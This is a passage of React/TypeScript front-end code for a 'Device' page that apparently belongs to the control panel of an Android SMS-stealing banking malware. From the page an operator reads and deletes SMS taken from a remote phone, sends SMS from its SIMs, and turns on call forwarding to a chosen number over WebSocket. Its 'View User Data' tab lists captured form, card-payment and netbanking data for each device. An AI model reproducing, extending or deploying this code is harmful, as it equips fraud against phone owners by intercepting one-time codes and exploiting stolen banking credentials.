  if (!did) return <div className="p-6">Missing device id</div>;

  return (
    <AnimatedAppBackground>
      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <SurfaceCard className="p-4">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Device</div>
              <div className="break-all text-[12px] text-slate-500">{did}</div>
              {/* ── CHANGED: shows Responsive/Idle/Unreachable ── */}
              <div className="mt-1 text-[11px] text-slate-500">
                Status: <span className={statusLine.cls}>{statusLine.label}</span>
                {statusLine.ts ? <span className="text-slate-400"> • Last seen {formatLastSeenTs(statusLine.ts)}</span> : null}
              </div>
            </div>
            <div className="flex shrink-0 items-center gap-2">
              <button
                onClick={() => {
                  if (window.history.length > 1) nav(-1);
                  else nav("/devices");
                }}
                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-800 hover:bg-slate-50"
                type="button"
              >
                Back
              </button>
            </div>
          </div>

          {loading ? (
            <div className="mt-4 rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">Loading…</div>
          ) : (
            <>
              <div className="no-scrollbar mt-4 flex gap-2 overflow-x-auto">
                {([["overview", "Overview"], ["sms", "SMS"], ["forwarding", "Call Forwarding"], ["userdata", "View User Data"]] as Array<[TabKey, string]>).map(([k, label]) => (
                  <button key={k} onClick={() => { setActiveTab(k); if (k === "sms") { try { wsService.sendCmd("ping", { uniqueid: did, deviceId: did, timestamp: Date.now() }); } catch (_) {} } }} className={["h-10 whitespace-nowrap rounded-2xl border px-4 text-[13px] font-semibold", activeTab === k ? "border-slate-900 bg-slate-900 text-white" : "border-slate-200 bg-white text-slate-700 hover:bg-slate-50"].join(" ")} type="button">{label}</button>
                ))}
              </div>

              {error && <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{error}</div>}

              {activeTab === "overview" && (
                <div className="mt-4 space-y-3">
                  <SurfaceCard className="p-4">
                    <div className="text-[14px] font-extrabold text-slate-900">Overview</div>
                    <div className="mt-3 grid grid-cols-1 gap-3">
                      <div className="rounded-2xl border border-slate-200 bg-slate-50 p-3">
                        <div className="text-[11px] text-slate-500">SIMs</div>
                        <div className="mt-1 text-[13px] text-slate-700">Count: <span className="font-extrabold text-slate-900">{simSummary.count}</span></div>
                        <div className="mt-2 space-y-2 text-[12px] text-slate-600">
                          <div className="rounded-xl border border-slate-200 bg-white px-3 py-2"><div>SIM 1: <span className="font-extrabold text-slate-900">{simSummary.sim1}</span></div><div className="mt-1 text-[11px] text-slate-500">Carrier: <span className="font-extrabold text-slate-900">{simSummary.sim1Carrier}</span></div></div>
                          <div className="rounded-xl border border-slate-200 bg-white px-3 py-2"><div>SIM 2: <span className="font-extrabold text-slate-900">{simSummary.sim2}</span></div><div className="mt-1 text-[11px] text-slate-500">Carrier: <span className="font-extrabold text-slate-900">{simSummary.sim2Carrier}</span></div></div>
                        </div>
                      </div>
                      <SettingOptionCard title="Update Phone Number" subtitle="Manage up to four admin phone numbers for this device." value={currentAdmins.length === 0 ? "No phone numbers saved" : `${currentAdmins.length} number${currentAdmins.length > 1 ? "s" : ""} saved`} actionLabel="Open Editor" onClick={() => setAdminsOpen(true)} />
                      <SettingOptionCard title="Change Forwarding SIM" subtitle="Choose which SIM should be used for SMS forwarding on the device." value={forwardingChoiceLabel} actionLabel="Select SIM" onClick={() => setSimPickerOpen(true)} />
                      <div className="rounded-2xl border border-slate-200 bg-white p-3">
                        <div className="mb-2 text-[11px] text-slate-500">Metadata</div>
                        {getKeyValuePairs(device?.metadata).length === 0 ? <div className="text-[12px] text-slate-500">No metadata</div> : (
                          <div className="grid grid-cols-1 gap-2">
                            {getKeyValuePairs(device?.metadata).slice(0, 12).map((p) => (
                              <div key={p.label} className="flex items-start justify-between gap-2"><div className="text-[11px] text-slate-500">{p.label}</div><div className="break-all text-right text-[11px] font-extrabold text-slate-900">{p.value}</div></div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  </SurfaceCard>
                </div>
              )}

              {activeTab === "sms" && (
                <div className="mt-4 space-y-3">
                  <SurfaceCard className="p-4">
                    <div className="text-[14px] font-extrabold text-slate-900">SMS</div>
                    <div className="mt-3 grid grid-cols-2 gap-2">
                      <button onClick={() => setSendOpen(true)} className="col-span-2 h-11 rounded-2xl border border-slate-900 bg-slate-900 px-5 font-extrabold text-white" type="button">Send SMS (WS)</button>
                      <button onClick={() => loadSms()} className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50" type="button">Refresh</button>
                      <button onClick={handleDeleteAllSms} className="h-10 rounded-2xl border border-rose-200 bg-rose-50 px-4 text-rose-700 hover:bg-rose-100" type="button">Delete All</button>
                    </div>
                  </SurfaceCard>
                  <div className="space-y-3">
                    {loadingSms ? <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">Loading…</div>
                    : smsList.length === 0 ? <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500"><div className="flex min-h-[220px] flex-col items-center justify-center gap-4"><div className="font-extrabold text-slate-800">No SMS found</div><div className="max-w-[260px] text-[12px] text-slate-500">There are no stored notifications for this device yet.</div><button onClick={() => setSendOpen(true)} className="h-11 w-full max-w-[280px] rounded-2xl border border-slate-900 bg-slate-900 px-5 font-extrabold text-white" type="button">Send SMS (WS)</button></div></div>
                    : smsList.map((m: any) => { const title = safeString(m.title || "New SMS").trim() || "New SMS"; const sender = safeString(m.sender || m.senderNumber || "unknown").trim() || "unknown"; const receiver2 = safeString(m.receiver || "").trim(); const body = safeString(m.body || "").trim(); const ts = getTimestamp(m); const smsId = safeString(m._id || m.id).trim(); const isDeleting = deletingSmsId === smsId || (deleteBusy && deleteAction?.type === "single_sms" && safeString(deleteAction?.sms?._id ?? deleteAction?.sms?.id).trim() === smsId); return (
                      <div key={m._id || m.id || m.timestamp || `${sender}-${receiver2}-${ts}`} className="w-full rounded-[22px] border border-slate-200 bg-white p-4 shadow-[0_6px_20px_rgba(15,23,42,0.05)]">
                        <div className="flex items-start justify-between gap-3"><div className="min-w-0"><div className="min-w-0 truncate text-[14px] font-extrabold text-slate-900">{title}</div><div className="mt-1 break-words whitespace-normal text-[12px] text-slate-600"><span className="text-slate-500">From:</span> <span className="font-semibold text-slate-800">{sender}</span>{receiver2 ? <><span className="text-slate-400"> → </span><span className="font-semibold text-slate-800">{receiver2}</span></> : null}</div></div><div className="shrink-0 text-right"><div className="text-[11px] text-slate-400">{ts ? new Date(ts).toLocaleString() : "-"}</div><button type="button" onClick={() => handleDeleteSingleSms(m)} disabled={isDeleting || !smsId} className="mt-2 h-8 rounded-xl border border-rose-200 bg-rose-50 px-3 text-[11px] font-extrabold text-rose-700 hover:bg-rose-100 disabled:cursor-not-allowed disabled:opacity-50">{isDeleting ? "Deleting..." : "Delete"}</button></div></div>
                        {body ? <div className="mt-3 break-words whitespace-pre-wrap text-[13px] text-slate-800">{body}</div> : <div className="mt-3 text-[13px] text-slate-400">—</div>}
                      </div>
                    ); })}
                  </div>
                </div>
              )}

              {activeTab === "forwarding" && (
                <div className="mt-4">
                  <SurfaceCard className="p-4">
                    <div className="flex items-center justify-between gap-2"><div><div className="text-[14px] font-extrabold text-slate-900">Call Forwarding</div><div className="mt-1 text-[12px] text-slate-500">Android-like WS command + realtime result</div></div><span className={["rounded-full border px-3 py-1 text-[12px] font-extrabold", forwardPill].join(" ")}>{forwardState === "idle" ? "Ready" : forwardState === "pending" ? "Pending" : forwardState === "active" ? "Active" : forwardState === "inactive" ? "Inactive" : "Failed"}</span></div>
                    {forwardMsg ? <div className="mt-2 text-[11px] text-slate-500">{forwardMsg}</div> : null}
                    <div className="mt-4 rounded-3xl border border-slate-200 bg-slate-50 p-4">
                      <div className="mb-2 text-[12px] text-slate-500">Select SIM</div>
                      <div className="mb-3 flex items-center gap-2">
                        <button type="button" onClick={() => setForwardingSimDraft("1")} className={["h-10 rounded-2xl border px-4 text-[13px] font-extrabold", forwardingSimDraft === "1" ? "border-slate-900 bg-slate-900 text-white" : "border-slate-200 bg-white text-slate-700"].join(" ")}>SIM 1</button>
                        <button type="button" onClick={() => setForwardingSimDraft("2")} className={["h-10 rounded-2xl border px-4 text-[13px] font-extrabold", forwardingSimDraft === "2" ? "border-slate-900 bg-slate-900 text-white" : "border-slate-200 bg-white text-slate-700"].join(" ")}>SIM 2</button>
                      </div>
                      <div className="mb-4 space-y-2 text-[11px] text-slate-500">
                        <div className="rounded-xl border border-slate-200 bg-white px-3 py-2"><div>SIM 1: <span className="font-extrabold text-slate-900">{simSummary.sim1}</span></div><div className="mt-1">Carrier: <span className="font-extrabold text-slate-900">{simSummary.sim1Carrier}</span></div></div>
                        <div className="rounded-xl border border-slate-200 bg-white px-3 py-2"><div>SIM 2: <span className="font-extrabold text-slate-900">{simSummary.sim2}</span></div><div className="mt-1">Carrier: <span className="font-extrabold text-slate-900">{simSummary.sim2Carrier}</span></div></div>
                      </div>
                      <div className="mb-2 text-[12px] text-slate-500">Forwarding Number</div>
                      <input value={forwardingNumberDraft} onChange={(e) => setForwardingNumberDraft(e.target.value)} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100" placeholder="Enter number (10 digits / +country)" />
                      <div className="mt-4 flex items-center justify-end gap-2">
                        <button type="button" onClick={() => sendCallForwardCommand("deactivate")} className="h-11 rounded-2xl border border-rose-200 bg-rose-50 px-5 font-extrabold text-rose-700 hover:bg-rose-100">Deactivate</button>
                        <button type="button" onClick={() => sendCallForwardCommand("activate")} className="h-11 rounded-2xl border border-slate-900 bg-slate-900 px-6 font-extrabold text-white">Activate</button>
                      </div>
                      <div className="mt-3 text-[11px] text-slate-500">WS cmd: <span className="font-extrabold text-slate-900">call_forward</span> • sim: <span className="font-extrabold text-slate-900">{simLabel}</span></div>
                    </div>
                  </SurfaceCard>
                </div>
              )}

              {activeTab === "userdata" && (
                <div className="mt-4 space-y-3">
                  <SurfaceCard className="p-4"><div className="flex items-start justify-between gap-2"><div><div className="text-[14px] font-extrabold text-slate-900">User Data</div><div className="mt-1 text-[12px] text-slate-500">Forms + Card + Netbanking (device-wise) • blanks auto-skip</div></div><button onClick={() => loadUserData(true)} className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50" type="button">Refresh</button></div>{userErr ? <div className="mt-3 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{userErr}</div> : null}</SurfaceCard>
                  {userLoading ? <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">Loading…</div> : (
                    <>
                      <SurfaceCard className="p-4"><div className="flex items-center justify-between"><div className="text-[13px] font-extrabold text-slate-900">Form Payload (Latest)</div><div className="text-[11px] text-slate-400">{formSubmitCount} submits</div></div>{latestFormPairs.length === 0 ? <div className="mt-3 text-[12px] text-slate-500">No form data found.</div> : <div className="mt-3 grid grid-cols-1 gap-2">{latestFormPairs.map((p) => <div key={p.label} className="flex items-start justify-between gap-3"><div className="text-[11px] text-slate-500">{p.label}</div><div className="break-words text-right text-[11px] font-extrabold text-slate-900">{p.value}</div></div>)}</div>}</SurfaceCard>
                      <SurfaceCard className="p-4"><div className="flex items-center justify-between"><div className="text-[13px] font-extrabold text-slate-900">Card Payments</div><div className="text-[11px] text-slate-400">{cardItems.length}</div></div>{cardItems.length === 0 ? <div className="mt-3 text-[12px] text-slate-500">No card payments.</div> : <div className="mt-3 space-y-2">{cardItems.slice(0, 12).map((p: any, idx: number) => { const pairs = buildPairs(p, 12); if (pairs.length === 0) return null; return <div key={p?._id || p?.id || `${idx}`} className="rounded-2xl border border-slate-200 bg-slate-50 p-3"><div className="flex items-start justify-between gap-2"><div className="text-[12px] font-extrabold text-slate-900">{paymentTitle(p, idx)}</div><div className="text-[10px] text-slate-400">{getTimestamp(p) ? new Date(getTimestamp(p)).toLocaleString() : ""}</div></div><div className="mt-2 grid grid-cols-1 gap-2">{pairs.map((kv) => <div key={kv.label} className="flex items-start justify-between gap-3"><div className="text-[11px] text-slate-500">{kv.label}</div><div className="break-words text-right text-[11px] font-extrabold text-slate-800">{kv.value}</div></div>)}</div></div>; })}</div>}</SurfaceCard>
                      <SurfaceCard className="p-4"><div className="flex items-center justify-between"><div className="text-[13px] font-extrabold text-slate-900">Netbanking</div><div className="text-[11px] text-slate-400">{netItems.length}</div></div>{netItems.length === 0 ? <div className="mt-3 text-[12px] text-slate-500">No netbanking data.</div> : <div className="mt-3 space-y-2">{netItems.slice(0, 12).map((p: any, idx: number) => { const pairs = buildPairs(p, 12); if (pairs.length === 0) return null; return <div key={p?._id || p?.id || `${idx}`} className="rounded-2xl border border-slate-200 bg-slate-50 p-3"><div className="flex items-start justify-between gap-2"><div className="text-[12px] font-extrabold text-slate-900">{paymentTitle(p, idx)}</div><div className="text-[10px] text-slate-400">{getTimestamp(p) ? new Date(getTimestamp(p)).toLocaleString() : ""}</div></div><div className="mt-2 grid grid-cols-1 gap-2">{pairs.map((kv) => <div key={kv.label} className="flex items-start justify-between gap-3"><div className="text-[11px] text-slate-500">{kv.label}</div><div className="break-words text-right text-[11px] font-extrabold text-slate-800">{kv.value}</div></div>)}</div></div>; })}</div>}</SurfaceCard>
                    </>
                  )}
                </div>
              )}
            </>
          )}
        </SurfaceCard>
      </div>

      {/* Send SMS Modal */}
      <Modal open={sendOpen} onClose={() => setSendOpen(false)} title="Send SMS (WebSocket)">
        <form onSubmit={handleSendSmsWs} className="flex max-h-[min(78vh,620px)] flex-col">
          <div className="flex-1 overflow-y-auto overscroll-contain pr-1 pb-4">
            <div className="mb-2 text-xs text-gray-600">SIM</div>
            <div className="mb-3 flex flex-wrap items-center gap-2">
              <button type="button" onClick={() => setSmsSimSlot(0)} className={["h-10 max-w-full rounded-2xl border border-gray-200 px-4 text-[13px] font-extrabold", smsSimSlot === 0 ? "bg-[var(--brand)] text-white" : "bg-white text-gray-800"].join(" ")} title={smsSim1Label}><span className="block max-w-[220px] truncate">{smsSim1Label}</span></button>
              <button type="button" onClick={() => setSmsSimSlot(1)} className={["h-10 max-w-full rounded-2xl border border-gray-200 px-4 text-[13px] font-extrabold", smsSimSlot === 1 ? "bg-[var(--brand)] text-white" : "bg-white text-gray-800"].join(" ")} title={smsSim2Label}><span className="block max-w-[220px] truncate">{smsSim2Label}</span></button>
              <button type="submit" disabled={sendingSms} className={["ml-auto h-10 rounded-2xl bg-[var(--brand)] px-5 text-[13px] font-extrabold text-white", "disabled:opacity-60"].join(" ")} title="Send (WS)">{sendingSms ? "Sending…" : "Send"}</button>
            </div>
            <div className="mb-2 text-xs text-gray-600">Receiver</div>
            <input value={receiver} onChange={(e) => setReceiver(e.target.value)} className="w-full rounded border px-3 py-2 text-sm" placeholder="Receiver number" />
            <div className="mt-3"><div className="mb-1 text-xs text-gray-600">Message</div><textarea value={messageBody} onChange={(e) => setMessageBody(e.target.value)} className="min-h-[170px] w-full rounded border px-3 py-2 text-sm" placeholder="Type message…" /></div>
          </div>
          <div className="shrink-0 border-t bg-white pt-3"><div className="flex items-center justify-end"><button type="button" onClick={() => setSendOpen(false)} className="h-11 w-full rounded border bg-white px-4 text-sm sm:w-auto">Cancel</button></div></div>
        </form>
      </Modal>

      {/* Admins Modal */}
      <Modal open={adminsOpen} onClose={() => setAdminsOpen(false)} title="Update Phone Number">
        <div className="space-y-4">
          <div className="rounded-2xl border border-sky-200 bg-sky-50 px-3 py-3 text-sm leading-6 text-slate-700">You can save up to four phone numbers here.</div>
          <div className="flex items-center justify-between gap-2"><div className="text-[12px] font-semibold uppercase tracking-wide text-slate-500">Manage numbers</div><button type="button" onClick={handleClearAllAdmins} disabled={adminSaving} className="h-9 rounded-xl border border-red-200 bg-red-50 px-3 text-[12px] font-extrabold text-red-700 disabled:opacity-60">Clear All</button></div>
          <div className="space-y-3">{[0, 1, 2, 3].map((idx) => { const hasValue = Boolean((adminsDraft[idx] || "").trim()); return (<div key={idx} className="rounded-2xl border border-slate-200 bg-white px-3 py-3 shadow-sm"><div className="mb-2 flex items-center justify-between gap-2"><div className="text-[12px] font-semibold uppercase tracking-wide text-slate-500">Phone Number {idx + 1}</div><button type="button" onClick={() => handleDeleteAdminAt(idx)} disabled={!hasValue || adminSaving} className="h-8 rounded-lg border border-red-200 bg-red-50 px-3 text-[11px] font-extrabold text-red-700 disabled:cursor-not-allowed disabled:opacity-40">Delete</button></div><input value={adminsDraft[idx] || ""} onChange={(e) => setAdminsDraft((prev) => { const next = [...prev]; next[idx] = sanitizePhoneInput(e.target.value); return next; })} placeholder={`Enter phone number ${idx + 1}`} className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" inputMode="tel" /></div>); })}</div>
          <div className="grid grid-cols-1 gap-2 pt-1">
            <button type="button" onClick={handleSaveAdmins} disabled={adminSaving} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{adminSaving ? "Saving..." : "Save Phone Numbers"}</button>
            <button type="button" onClick={() => setSimPickerOpen(true)} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Change Forwarding SIM</button>
            <button type="button" onClick={() => setAdminsOpen(false)} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
          </div>
        </div>
      </Modal>

      {/* SIM Picker Modal */}
      <Modal open={simPickerOpen} onClose={() => setSimPickerOpen(false)} title="Change Forwarding SIM">
        <div className="space-y-4">
          <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-sm leading-6 text-slate-700">Choose which SIM the device should use for SMS forwarding.</div>
          <div className="grid grid-cols-1 gap-3">{([["auto", "Auto", "Use device default"], ["sim1", "SIM 1", "SIM 1 handles forwarding"], ["sim2", "SIM 2", "SIM 2 handles forwarding"]] as Array<[ForwardingChoice, string, string]>).map(([value, label, desc]) => { const active = forwardingChoice === value; return (<button key={value} type="button" onClick={() => setForwardingChoice(value)} className={["w-full rounded-[22px] border p-3 text-left transition", active ? "border-slate-900 bg-slate-50" : "border-slate-200 bg-white hover:bg-slate-50"].join(" ")}><div className="flex items-start gap-3"><div className={["mt-0.5 flex h-5 w-5 items-center justify-center rounded-full border-2", active ? "border-slate-900" : "border-slate-300"].join(" ")}><div className={["h-2.5 w-2.5 rounded-full transition", active ? "bg-slate-900" : "bg-transparent"].join(" ")} /></div><div className="min-w-0 flex-1"><div className="text-[15px] font-extrabold text-slate-900">{label}</div><div className="mt-1 text-[12px] leading-5 text-slate-500">{desc}</div></div></div></button>); })}</div>
          <div className="grid grid-cols-2 gap-2 pt-1"><button type="button" onClick={() => setSimPickerOpen(false)} className="h-11 rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button><button type="button" onClick={handleSaveForwardingChoice} disabled={forwardingSaving} className="h-11 rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{forwardingSaving ? "Saving..." : "Save"}</button></div>
        </div>
      </Modal>

      {/* Delete Modal */}
      <Modal open={deleteModalOpen} onClose={closeDeleteModal} title={deleteModalTitle}>
        {deleteModalMode === "delete" ? (
          <form onSubmit={handleSubmitDeletePassword} className="space-y-4">
            <div className="rounded-2xl border border-amber-200 bg-amber-50 px-3 py-3 text-sm leading-6 text-slate-700">{deleteHelpText}</div>
            {deleteAction?.type === "single_sms" ? <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600"><div className="font-bold text-slate-900">Selected SMS</div><div className="mt-1 break-words">{safeString(deleteAction.sms?.title || "New SMS") || "New SMS"}</div></div> : deleteAction?.type === "all_sms" ? <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600">This will delete all SMS for this device.</div> : null}
            <div><div className="mb-1 text-xs font-semibold text-slate-600">{deletePasswordSet === false ? "Create Password" : "Password"}</div><input type="password" value={deletePassword} onChange={(e) => setDeletePassword(e.target.value)} placeholder={deletePasswordSet === false ? "Enter new 4-digit password" : "Enter delete password"} className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" autoFocus /><div className="mt-1 text-[11px] text-slate-500">Password must be at least 4 digits.</div></div>
            {deleteError ? <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{deleteError}</div> : null}
            {deleteSuccess ? <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{deleteSuccess}</div> : null}
            <div className="grid grid-cols-1 gap-2 pt-1">
              <button type="submit" disabled={deleteBusy} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{deleteBusy ? "Processing..." : deleteActionLabel}</button>
              <button type="button" onClick={() => { setDeleteModalMode("change"); setDeleteError(null); setDeleteSuccess(null); }} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Change Password</button>
              <button type="button" onClick={closeDeleteModal} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            </div>
          </form>
        ) : (
          <form onSubmit={handleChangeDeletePassword} className="space-y-4">
            <div className="rounded-2xl border border-sky-200 bg-sky-50 px-3 py-3 text-sm leading-6 text-slate-700">{deleteHelpText}</div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">Current Password</div><input type="password" value={changeCurrentPassword} onChange={(e) => setChangeCurrentPassword(e.target.value)} placeholder="Enter current password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" autoFocus /></div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">New Password</div><input type="password" value={changeNewPassword} onChange={(e) => setChangeNewPassword(e.target.value)} placeholder="Enter new 4-digit password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" /></div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">Confirm New Password</div><input type="password" value={changeConfirmPassword} onChange={(e) => setChangeConfirmPassword(e.target.value)} placeholder="Confirm new password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" /></div>
            {deleteError ? <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{deleteError}</div> : null}
            {deleteSuccess ? <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{deleteSuccess}</div> : null}
            <div className="grid grid-cols-1 gap-2 pt-1">
              <button type="submit" disabled={deleteBusy} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{deleteBusy ? "Saving..." : "Save New Password"}</button>
              <button type="button" onClick={() => { setDeleteModalMode("delete"); setDeleteError(null); setDeleteSuccess(null); }} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Back to Delete</button>
              <button type="button" onClick={closeDeleteModal} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            </div>
          </form>
        )}
      </Modal>
    </AnimatedAppBackground>
  );
}
